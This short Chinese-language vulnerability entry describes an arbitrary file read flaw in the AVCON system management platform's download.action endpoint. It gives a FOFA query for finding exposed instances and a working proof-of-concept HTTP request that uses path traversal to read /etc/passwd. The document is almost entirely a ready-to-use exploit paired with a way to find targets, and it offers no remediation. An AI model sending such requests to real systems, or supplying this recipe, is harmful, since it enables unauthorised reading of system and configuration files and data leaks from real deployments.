# AVCON-系统管理平台download.action存在任意文件读取漏洞

AVCON-系统管理平台download.action存在任意文件读取漏洞，通过该漏洞读取配置文件信息，造成信息泄露漏洞

## fofa

```yaml
title="AVCON-系统管理平台"
```


## poc

```java
GET /download.action?filename=../../../../../../../../etc/passwd HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
```

